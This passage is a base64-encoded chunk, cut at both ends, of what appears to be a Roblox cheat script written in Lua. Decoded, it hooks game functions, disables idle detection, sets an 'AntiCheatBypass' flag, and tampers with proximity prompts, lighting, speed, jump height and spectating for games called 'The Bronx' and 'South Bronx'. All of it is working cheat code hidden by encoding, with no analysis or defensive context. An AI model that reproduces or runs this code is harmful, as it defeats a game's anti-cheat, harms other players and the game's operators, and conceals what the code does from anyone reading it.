BlbmQKCiAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBTZXJ2aWNlcy5SZXBsaWNhdGVkU3RvcmFnZS5Xb3Jrc3BhY2UuTlBDczpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgIFZhbHVlLlBhcmVudCA9IFNlcnZpY2VzLldvcmtzcGFjZS5Gb2xkZXJzLk5QQ3MKICAgICAgICBlbmQKCiAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBTZXJ2aWNlcy5Xb3Jrc3BhY2UuRm9sZGVycy5OUENzOkdldENoaWxkcmVuKCkgZG8KICAgICAgICAgICAgVmFsdWU6R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCdQYXJlbnQnKTpDb25uZWN0KExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICBWYWx1ZS5QYXJlbnQgPSBTZXJ2aWNlcy5Xb3Jrc3BhY2UuRm9sZGVycy5OUENzCiAgICAgICAgICAgIGVuZCkpCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIHRhc2tfd2FpdF9ob29rOyB0YXNrX3dhaXRfaG9vayA9IGhvb2tmdW5jdGlvbih0YXNrLndhaXQsIExQSF9OT19VUFZBTFVFUyhmdW5jdGlvbiguLi4pCiAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7Li4ufQogICAgICAgICAgICBsb2NhbCB0cmFjZWJhY2sgPSBkZWJ1Zy50cmFjZWJhY2soKQoKICAgICAgICAgICAgaWYgYXJnc1sxXSA9PSAyLjUgYW5kIHRyYWNlYmFjazpmaW5kKCJMb29wIikgYW5kIHRyYWNlYmFjazpmaW5kKCJOUENzIikgdGhlbiAKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIHJldHVybiB0YXNrX3dhaXRfaG9vayAoLi4uKQogICAgICAgIGVuZCkpCgogICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gZ2V0Y29ubmVjdGlvbnMoU2VydmljZXMuUGxheWVycy5Mb2NhbFBsYXllci5JZGxlZCkgZG8KICAgICAgICAgICAgaWYgVmFsdWVbIkRpc2FibGUiXSB0aGVuCiAgICAgICAgICAgICAgICBWYWx1ZVsiRGlzYWJsZSJdKFZhbHVlKQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGlmIFZhbHVlWyJEaXNjb25uZWN0Il0gdGhlbgogICAgICAgICAgICAgICAgVmFsdWVbIkRpc2Nvbm5lY3QiXShWYWx1ZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGdldF9uaWxfaW5zdGFuY2UgPSBMUEhfSklUX01BWChmdW5jdGlvbihuYW1lLCBjbGFzcykgCiAgICAgICAgICAgIGxvY2FsIGZvdW5kID0gbmlsIAoKICAgICAgICAgICAgZm9yIF8sIGluc3RhbmNlIGluIGdldG5pbGluc3RhbmNlcygpIGRvIAogICAgICAgICAgICAgICAgbG9jYWwgaW5zdGFuY2VOYW1lID0gaW5zdGFuY2UuTmFtZSAKCiAgICAgICAgICAgICAgICBpZiBjbGFzcyB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGluc3RhbmNlOklzQShjbGFzcykgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgaWYgaW5zdGFuY2VOYW1lOmZpbmQobmFtZSkgdGhlbiAKICAgICAgICAgICAgICAgICAgICAgICAgZm91bmQgPSBpbnN0YW5jZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIGlmIGluc3RhbmNlTmFtZTpmaW5kKG5hbWUpIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgIGZvdW5kID0gaW5zdGFuY2UKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIHJldHVybiBmb3VuZAogICAgICAgIGVuZCkKCiAgICAgICAgcmVwZWF0IHRhc2sud2FpdCgpIHVudGlsIGdldF9uaWxfaW5zdGFuY2UoIkd1biIsICJNb2R1bGVTY3JpcHQiKQoKICAgICAgICBsb2NhbCBndW5fbW9kdWxlID0gZ2V0c2VudihnZXRfbmlsX2luc3RhbmNlKCJHdW4iLCAiTW9kdWxlU2NyaXB0IikpCgogICAgICAgIGxvY2FsIG9sZDsgb2xkID0gaG9va2Z1bmN0aW9uKGd1bl9tb2R1bGUueCwgTFBIX05PX1VQVkFMVUVTKGZ1bmN0aW9uKCkKICAgICAgICAgICAgcmV0dXJuIG5pbAogICAgICAgIGVuZCkpCgogICAgICAgIC0tW1tsb2NhbCBPbGQ7IE9sZCA9IGhvb2ttZXRhbWV0aG9kKGdhbWUsICJfX2luZGV4IiwgTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oLi4uKQogICAgICAgICAgICBsb2NhbCBTZWxmLCBJbmRleCA9IC4uLgoKICAgICAgICAgICAgaWYgY2hlY2tjYWxsZXIoKSB0aGVuCiAgICAgICAgICAgICAgICByZXR1cm4gT2xkKC4uLikKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiBJbmRleCB+PSAiQ2FuQ29sbGlkZSIgdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIE9sZCguLi4pCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaWYgdHlwZW9mKFNlbGYpID09ICJJbnN0YW5jZSIgYW5kIFNlbGYuTmFtZSBhbmQgQ29sbGlkZV9EYXRhW1NlbGYuTmFtZV0gdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIENvbGxpZGVfRGF0YVtTZWxmLk5hbWVdCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaWYgdHlwZW9mKFNlbGYpID09ICJJbnN0YW5jZSIgYW5kIFNlbGYuTmFtZSBhbmQgU2VsZi5OYW1lID09ICJUYWJsZSIgdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIHRydWUKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICByZXR1cm4gT2xkKC4uLikKICAgICAgICBlbmQpKV1dCgogICAgICAgIGdldGdlbnYoKS5BbnRpQ2hlYXRCeXBhc3MgPSB0cnVlCiAgICBlbmQKCiAgICByZXBlYXQgU2VydmljZXMuUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOldhaXQoKSB1bnRpbCBnZXRnZW52KCkuQW50aUNoZWF0QnlwYXNzID09IHRydWUKZW5kCgpsb2NhbCBPbGRMaWdodGluZ1NldHRpbmdzID0ge30KCk9sZExpZ2h0aW5nU2V0dGluZ3NbIkJyaWdodG5lc3MiXSA9IExpZ2h0aW5nLkJyaWdodG5lc3MKT2xkTGlnaHRpbmdTZXR0aW5nc1siQ2xvY2tUaW1lIl0gPSBMaWdodGluZy5DbG9ja1RpbWUKT2xkTGlnaHRpbmdTZXR0aW5nc1siRm9nRW5kIl0gPSBMaWdodGluZy5Gb2dFbmQKT2xkTGlnaHRpbmdTZXR0aW5nc1siR2xvYmFsU2hhZG93cyJdID0gTGlnaHRpbmcuR2xvYmFsU2hhZG93cwpPbGRMaWdodGluZ1NldHRpbmdzWyJPdXRkb29yQW1iaWVudCJdID0gTGlnaHRpbmcuT3V0ZG9vckFtYmllbnQKCmRvCiAgICBMUEhfSklUX01BWChmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgZ2V0bmFtZWNhbGxtZXRob2QsIGhvb2ttZXRhbWV0aG9kLCBob29rZnVuY3Rpb24gPSAoZ2V0bmFtZWNhbGxtZXRob2Qgfj0gbmlsKSBhbmQgY2xvbmVmdW5jdGlvbihnZXRuYW1lY2FsbG1ldGhvZCkgb3IgZnVuY3Rpb24oLi4uKSBlbmQsIChob29rbWV0YW1ldGhvZCB+PSBuaWwpIGFuZCBjbG9uZWZ1bmN0aW9uKGhvb2ttZXRhbWV0aG9kKSBvciBmdW5jdGlvbiguLi4pIGVuZCwgKGhvb2tmdW5jdGlvbiB+PSBuaWwpIGFuZCBjbG9uZWZ1bmN0aW9uKGhvb2tmdW5jdGlvbikgb3IgZnVuY3Rpb24oLi4uKSBlbmQKICAgICAgICBfZmlyZXByb3hpbWl0eXByb21wdCA9IGZpcmVwcm94aW1pdHlwcm9tcHQKICAgICAgICBpZiBTb2xhcmEgb3Igbm90IGZpcmVwcm94aW1pdHlwcm9tcHQgb3Igc3RyaW5nLmZpbmQoaWRlbnRpZnlleGVjdXRvcigpLCAiTWFjU3Bsb2l0IikgdGhlbgogICAgICAgICAgICBnZXRnZW52KCkuZmlyZXByb3hpbWl0eXByb21wdCA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKHNlbGYsIHZ1bG4pCiAgICAgICAgICAgICAgICBsb2NhbCBwcm9tcHRfc2V0dGluZ3MgPSB7WyJIb2xkRHVyYXRpb24iXSA9IHNlbGYuSG9sZER1cmF0aW9uOyBbIlJlcXVpcmVzTGluZU9mU2lnaHQiXSA9IHNlbGYuUmVxdWlyZXNMaW5lT2ZTaWdodH07CgogICAgICAgICAgICAgICAgaWYgbm90IHZ1bG4gdGhlbgogICAgICAgICAgICAgICAgICAgIHNlbGYuSG9sZER1cmF0aW9uID0gMDsgc2VsZi5SZXF1aXJlc0xpbmVPZlNpZ2h0ID0gZmFsc2U7CgogICAgICAgICAgICAgICAgICAgIHNlbGY6SW5wdXRIb2xkQmVnaW4oKQoKICAgICAgICAgICAgICAgICAgICBpZiBub3QgKHNlbGYuSG9sZER1cmF0aW9uID09IDApIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KHNlbGYuSG9sZER1cmF0aW9uKQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICBzZWxmOklucHV0SG9sZEVuZCgpCgogICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gcHJvbXB0X3NldHRpbmdzIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGZbSW5kZXhdID0gVmFsdWUKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBzZWxmLkhvbGREdXJhdGlvbiA9IDA7IHNlbGYuUmVxdWlyZXNMaW5lT2ZTaWdodCA9IGZhbHNlOwoKICAgICAgICAgICAgICAgICAgICBfZmlyZXByb3hpbWl0eXByb21wdChzZWxmKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgVGludCA9IEluc3RhbmNlLm5ldygiQ29sb3JDb3JyZWN0aW9uRWZmZWN0IiwgTGlnaHRpbmcpCiAgICAgICAgbG9jYWwgT2xkU2F0dXJhdGlvbiA9IExpZ2h0aW5nLkNvbG9yQ29ycmVjdGlvbi5TYXR1cmF0aW9uCiAgICAgICAgbG9jYWwgT2xkRm9nQ29sb3IgPSBMaWdodGluZy5Gb2dDb2xvcgogICAgICAgIGxvY2FsIFNldF9Gb2csIFNldF9Gb3YsIFNldF9GdWxsQnJpZ2h0ID0gZmFsc2UsIGZhbHNlLCBmYWxzZQogICAgICAgIFJ1blNlcnZpY2UuUHJlUmVuZGVyOkNvbm5lY3QoTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBDb25maWcuV29ybGRWaXN1YWxzLlNhdHVyYXRpb25FbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgIExpZ2h0aW5nLkNvbG9yQ29ycmVjdGlvbi5TYXR1cmF0aW9uID0gQ29uZmlnLldvcmxkVmlzdWFscy5TYXR1cmF0aW9uX1ZhbHVlCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIExpZ2h0aW5nLkNvbG9yQ29ycmVjdGlvbi5TYXR1cmF0aW9uID0gT2xkU2F0dXJhdGlvbgogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGlmIENvbmZpZy5Xb3JsZFZpc3VhbHMuRnVsbGJyaWdodCB0aGVuCiAgICAgICAgICAgICAgICBTZXRfRnVsbEJyaWdodCA9IGZhbHNlCiAgICAgICAgICAgICAgICBMaWdodGluZy5CcmlnaHRuZXNzID0gMgogICAgICAgICAgICAgICAgTGlnaHRpbmcuQ2xvY2tUaW1lID0gMTQKICAgICAgICAgICAgICAgIExpZ2h0aW5nLkZvZ0VuZCA9IDEwMDAwMAogICAgICAgICAgICAgICAgTGlnaHRpbmcuR2xvYmFsU2hhZG93cyA9IHRydWUKICAgICAgICAgICAgICAgIExpZ2h0aW5nLk91dGRvb3JBbWJpZW50ID0gQ29sb3IzLmZyb21SR0IoMTI4LCAxMjgsIDEyOCkKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgaWYgbm90IFNldF9GdWxsQnJpZ2h0IHRoZW4KICAgICAgICAgICAgICAgICAgICBTZXRfRnVsbEJyaWdodCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBMaWdodGluZy5CcmlnaHRuZXNzID0gT2xkTGlnaHRpbmdTZXR0aW5ncy5CcmlnaHRuZXNzCiAgICAgICAgICAgICAgICAgICAgTGlnaHRpbmcuRm9nRW5kID0gT2xkTGlnaHRpbmdTZXR0aW5ncy5Gb2dFbmQKICAgICAgICAgICAgICAgICAgICBMaWdodGluZy5HbG9iYWxTaGFkb3dzID0gT2xkTGlnaHRpbmdTZXR0aW5ncy5HbG9iYWxTaGFkb3dzCiAgICAgICAgICAgICAgICAgICAgTGlnaHRpbmcuT3V0ZG9vckFtYmllbnQgPSBPbGRMaWdodGluZ1NldHRpbmdzLk91dGRvb3JBbWJpZW50CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiBDb25maWcuV29ybGRWaXN1YWxzLkFtYmllbnRFbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgIFRpbnQuVGludENvbG9yID0gQ29uZmlnLldvcmxkVmlzdWFscy5BbWJpZW50Q29sb3IKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgVGludC5UaW50Q29sb3IgPSBDb2xvcjMubmV3KDEsMSwxKQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGlmIENvbmZpZy5Xb3JsZFZpc3VhbHMuRm9nQ29sb3JFbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgIFNldF9Gb2cgPSBmYWxzZQogICAgICAgICAgICAgICAgTGlnaHRpbmcuRm9nQ29sb3IgPSBDb25maWcuV29ybGRWaXN1YWxzLkZvZ0NvbG9yCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIGlmIG5vdCBTZXRfRm9nIHRoZW4KICAgICAgICAgICAgICAgICAgICBTZXRfRm9nID0gdHJ1ZQoKICAgICAgICAgICAgICAgICAgICBMaWdodGluZy5Gb2dDb2xvciA9IE9sZEZvZ0NvbG9yCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiBDb25maWcuVGhlQnJvbngudGIzX2ZvdiB0aGVuCiAgICAgICAgICAgICAgICBTZXRfRm92ID0gZmFsc2UKICAgICAgICAgICAgICAgIENhbWVyYS5GaWVsZE9mVmlldyA9IENvbmZpZy5UaGVCcm9ueC5GaWVsZE9mVmlld1ZhbHVlCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIGlmIG5vdCBTZXRfRm92IHRoZW4gCiAgICAgICAgICAgICAgICAgICAgU2V0X0ZvdiA9IHRydWUKICAgICAgICAgICAgICAgICAgICBDYW1lcmEuRmllbGRPZlZpZXcgPSA3MAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkpCgogICAgICAgIGxvY2FsIFN0YW1pbmFfVGFibGUgPSB7fTsKCiAgICAgICAgaWYgR2FtZV9OYW1lID09ICJTb3V0aCBCcm9ueCIgYW5kIG5vdCBTb2xhcmEgdGhlbgogICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIGdldGdjKHRydWUpIGRvCiAgICAgICAgICAgICAgICBpZiB0eXBlb2YoVmFsdWUpID09ICJ0YWJsZSIgYW5kIHJhd2dldChWYWx1ZSwgIlN0YW1pbmEiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgU3RhbWluYV9UYWJsZSA9IFZhbHVlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kOwoKICAgICAgICBsb2NhbCBTZXRfU3BlZWQsIFNldF9KdW1wUG93ZXIsIFNldF9TcGVjdGF0ZSA9IGZhbHNlLCBmYWxzZSwgZmFsc2UKICAgICAgICBpZiBHYW1lX05hbWUgPT0gIlRoZSBCcm9ueCIgdGhlbgogICAgICAgICAgICBSdW5TZXJ2aWNlOkJpbmRUb1JlbmRlclN0ZXAoIk1pc2NTZXR0aW5ncyIsIDEwMDAgLCBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihEZWx0YSkKICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3Igbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBvciBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikgdGhlbiByZXR1cm4gZW5kCgogICAgICAgICAgICAgICAgaWYgbm90IChHYW1lX05hbWUgPT0gIlNvdXRoIEJyb254IikgYW5kIG5vdCAoR2FtZV9OYW1lID09ICJSb2FkIFRvIFJpY2hlcyIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuTWlzY1NldHRpbmdzLk1vZGlmeVNwZWVkLkVuYWJsZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBTZXRfU3BlZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgRGlyZWN0aW9uID0gVmVjdG9yMy56ZXJvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFVzZXJJbnB1dFNlcnZpY2U6SXNLZXlEb3duKEVudW0uS2V5Q29kZS5XKSB0aGVuIERpcmVjdGlvbiArPSBDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFVzZXJJbnB1dFNlcnZpY2U6SXNLZXlEb3duKEVudW0uS2V5Q29kZS5TKSB0aGVuIERpcmVjdGlvbiAtPSBDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFVzZXJJbnB1dFNlcnZpY2U6SXNLZXlEb3duKEVudW0uS2V5Q29kZS5BKSB0aGVuIERpcmVjdGlvbiAtPSBDYW1lcmEuQ0ZyYW1lLlJpZ2h0VmVjdG9yIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBVc2VySW5wdXRTZXJ2aWNlOklzS2V5RG93bihFbnVtLktleUNvZGUuRCkgdGhlbiBEaXJlY3Rpb24gKz0gQ2FtZXJhLkNGcmFtZS5SaWdodFZlY3RvciBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIERpcmVjdGlvbi5NYWduaXR1ZGUgPiAwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpDaGFuZ2VTdGF0ZSgwKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSArPSBEaXJlY3Rpb24uVW5pdCAqIENvbmZpZy5NaXNjU2V0dGluZ3MuTW9kaWZ5U3BlZWQuVmFsdWUgKiBEZWx0YQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpHZXRTdGF0ZSgpID09IEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuRmFsbGluZ0Rvd24gdGhlbiBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6Q2hhbmdlU3RhdGUoMikgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IFNldF9TcGVlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZXRfU3BlZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkNoYW5nZVN0YXRlKDIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikuV2Fsa1NwZWVkID0gVXNlcklucHV0U2VydmljZTpJc0tleURvd24oRW51bS5LZXlDb2RlLkxlZnRTaGlmdCkgYW5kIDE2IG9yIDcKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuTWlzY1NldHRpbmdzLk1vZGlmeUp1bXAuRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFNldF9KdW1wUG93ZXIgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikuSnVtcEhlaWdodCA9IENvbmZpZy5NaXNjU2V0dGluZ3MuTW9kaWZ5SnVtcC5WYWx1ZQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IFNldF9KdW1wUG93ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgU2V0X0p1bXBQb3dlciA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikuSnVtcEhlaWdodCA9IDcKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBDb25maWcuVGhlQnJvbnguUGxheWVyVXRpbGl0aWVzLlNwZWN0YXRlUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgICAgICBTZXRfU3BlY3RhdGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIGxvY2FsIFN1YmplY3QgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIpIGFuZCBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIpLkNoYXJhY3RlciBhbmQgUGxheWVyczpGaW5kRmlyc3RDaGlsZChDb25maWcuVGhlQnJvbnguUGxheWVyVXRpbGl0aWVzLlNlbGVjdGVkUGxheWVyKS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikKCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLlRoZUJyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcikgb3Igbm90IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLlRoZUJyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcikuQ2hhcmFjdGVyIG9yIG5vdCBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIpLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFN1YmplY3QgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgQ2FtZXJhLkNhbWVyYVN1YmplY3QgPSBTdWJqZWN0CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IFNldF9TcGVjdGF0ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFNldF9TcGVjdGF0ZSA9IHRydWUKCiAgICAgICAgICAgICAgICAgICAgICAgIENhbWVyYS5DYW1lcmFTdWJqZWN0ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKSkKICAgICAgICBlbHNlCiAgICAgICAgICAgIFJ1blNlcnZpY2U6QmluZFRvUmVuZGVyU3RlcCgiTWlzY1NldHRpbmdzIiwgMTAwMCAsIExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3Igbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBvciBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikgdGhlbiByZXR1cm4gZW5kCgogICAgICAgICAgICAgICAgaWYgbm90IChHYW1lX05hbWUgPT0gIlNvdXRoIEJyb254IikgYW5kIG5vdCAoR2FtZV9OYW1lID09ICJSb2FkIFRvIFJpY2hlcyIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuTWlzY1NldHRpbmdzLk1vZGlmeVNwZWVkLkVuYWJsZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBTZXRfU3BlZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikuV2Fsa1NwZWVkID0gQ29uZmlnLk1pc2NTZXR0aW5ncy5Nb2RpZnlTcGVlZC5WYWx1ZQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IFNldF9TcGVlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZXRfU3BlZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpLldhbGtTcGVlZCA9IDE2CiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLk1pc2NTZXR0aW5ncy5Nb2RpZnlKdW1wLkVuYWJsZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBTZXRfSnVtcFBvd2VyID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpLkp1bXBQb3dlciA9IENvbmZpZy5NaXNjU2V0dGluZ3MuTW9kaWZ5SnVtcC5WYWx1ZQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IFNldF9KdW1wUG93ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgU2V0X0p1bXBQb3dlciA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikuSnVtcFBvd2VyID0gNTAKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBDb25maWcuU291dGhfQnJvbnguUGxheWVyVXRpbGl0aWVzLlNwZWN0YXRlUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgICAgICBTZXRfU3BlY3RhdGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIGxvY2FsIFN1YmplY3QgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKENvbmZpZy5Tb3V0aF9Ccm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIpIGFuZCBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKENvbmZpZy5Tb3V0aF9Ccm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIpLkNoYXJhY3RlciBhbmQgUGxheWVyczpGaW5kRmlyc3RDaGlsZChDb25maWcuU291dGhfQnJvbnguUGxheWVyVXRp